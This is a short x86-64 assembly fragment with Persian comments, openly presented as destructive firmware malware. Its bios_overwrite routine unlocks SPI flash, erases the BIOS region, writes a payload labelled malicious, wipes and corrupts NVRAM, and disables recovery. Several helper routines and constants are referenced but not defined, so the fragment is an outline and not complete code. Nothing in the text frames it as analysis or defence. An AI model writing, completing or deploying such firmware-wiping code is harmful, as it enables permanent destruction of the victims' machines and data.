section .text
global bios_overwrite

bios_overwrite:
    ; باز کردن قفل SPI Flash
    call unlock_spi_flash
    
    ; پاک‌کردن منطقه BIOS
    mov rdi, SPI_BIOS_REGION
    call erase_bios_region
    
    ; نوشتن پیلود مخرب
    mov rdi, malicious_bios_payload
    mov rsi, bios_payload_size
    mov rdx, SPI_BIOS_REGION
    call write_spi_flash
    
    ; دستکاری NVRAM
    call corrupt_nvram
    
    ; غیرفعال‌کردن بازیابی
    call disable_recovery
    ret

corrupt_nvram:
    ; پاک‌کردن تمام متغیرهای NVRAM
    mov rdi, NVRAM_BASE
    mov rcx, NVRAM_SIZE
    xor rax, rax
    rep stosb
    
    ; نوشتن داده‌های مخرب
    mov rdi, nvram_malicious_data
    mov rsi, nvram_malicious_size
    mov rdx, NVRAM_BASE
    call write_spi_flash
    ret
    